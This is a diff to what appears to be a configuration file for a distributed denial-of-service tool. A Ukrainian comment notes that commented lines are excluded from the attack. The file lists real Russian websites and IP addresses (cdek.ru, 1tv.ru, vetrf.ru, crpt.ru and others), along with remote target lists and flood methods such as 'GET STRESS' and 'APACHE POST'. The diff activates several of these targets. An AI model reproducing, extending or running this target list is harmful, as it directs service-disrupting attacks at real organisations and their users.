@@ -1,6 +1,10 @@
 #Рядки, що починаються на # - не беруться в атаку!
 
-#UNCOMMENT:
+#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l7_url --http-methods GET STRESS
+
+#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l7_http --http-methods GET STRESS
+
+#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/avia/avia_l4_tcp
 
 -c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/IPTV/iptv_l7_url --http-methods GET STRESS
 
@@ -19,8 +23,6 @@
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/vetfr/vetrf_l4_tcp
 
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/vetfr/vetrf_api --http-methods APACHE POST
-
-#COMMENT:
 
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/sber_url --http-methods GET STRESS
 
@@ -42,15 +44,15 @@ https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ h
 
 #https://okko.tv https://mimimi.okko.team/ https://pobeda.okko.tv https://www.ontvtime.ru https://www.amediateka.ru https://kodiki.amediateka.ru/ https://rt.amediateka.ru/ https://akado.amediateka.ru/ https://wink.ru https://www.1tv.ru/live https://cm.1tv.ru/ https://tlxmob.1tv.ru/ https://25.1tv.ru/ https://kino.1tv.ru/ https://users.1tv.ru/ http://edu.1tv.ru/ https://admin.kino.1tv.ru/ https://stage.1tv.ru/ https://subscr.1tv.ru/ https://kino-teatr.ru http://m.kino-teatr.ru/ https://mt.kino-teatr.ru/ --http-methods GET STRESS
 
-#-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/get.lst --http-methods GET STRESS
+-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/atolAPI/get.lst --http-methods GET APACHE POST
 
 #https://vetrf.ru/ https://idp.vetrf.ru/idp/profile/SAML2/POST/SSO?execution=e1s1 https://duma.vetrf.ru/ https://vesta.vetrf.ru/ https://accounts.vetrf.ru https://cerberus.vetrf.ru/cerberus/ https://ecert.vetrf.ru https://help.vetrf.ru/wiki/ https://t2-idp.vetrf.ru/idp/ https://t2-aplms.vetrf.ru/pub/ --http-methods GET STRESS
 
 #https://62.76.145.83:443 http://62.76.145.85:8443 http://62.76.145.203:80 http://62.76.145.203:8080 tcp://62.76.145.85:8443 tcp://62.76.145.84:443 tcp://62.76.145.10:80 tcp://62.76.145.10:443 --http-methods GET STRESS
 
-#https://www.cdek.ru https://cdek.kz/ru/ https://cdek.by/ru/ https://bonus.cdek.ru https://api.cdek.ru https://global.cdek.ru https://mx12.cdek.ru http://pokupkiusa.cdek.ru https://shopoglot.com/?ref=cdek https://pokupkiusa.track24.ru/ http://login.izusa.cdek.ru https://fivepost.ru https://boxberry.ru https://u.boxberry.ru/ https://www.cse.ru --http-methods GET STRESS
+https://www.cdek.ru https://cdek.kz/ru/ https://cdek.by/ru/ https://bonus.cdek.ru https://api.cdek.ru https://global.cdek.ru https://mx12.cdek.ru http://pokupkiusa.cdek.ru https://shopoglot.com/?ref=cdek https://pokupkiusa.track24.ru/ http://login.izusa.cdek.ru https://fivepost.ru https://boxberry.ru https://u.boxberry.ru/ https://www.cse.ru --http-methods GET STRESS
 
-#http://178.248.238.208:80 http://193.232.108.86:80 https://193.107.237.86:443 https://185.65.22.9:443 http://194.49.120.60:80 https://194.49.120.60:443 tcp://178.248.232.188:80 tcp://178.248.232.188:443 --http-methods GET STRESS
+http://178.248.238.208:80 http://193.232.108.86:80 https://193.107.237.86:443 https://185.65.22.9:443 http://194.49.120.60:80 https://194.49.120.60:443 tcp://178.248.232.188:80 tcp://178.248.232.188:443 --http-methods GET STRESS
 
 #https://www.cdek.ru https://cdekid.cdek.ru https://tender-buy.cdek.ru/Tenders https://cdek.kz/ru/ https://cdek.by/ru/ https://bonus.cdek.ru https://api.cdek.ru https://global.cdek.ru https://mx12.cdek.ru http://pokupkiusa.cdek.ru https://shopoglot.com/?ref=cdek https://pokupkiusa.track24.ru/ http://login.izusa.cdek.ru https://fivepost.ru  --http-methods GET STRESS
 
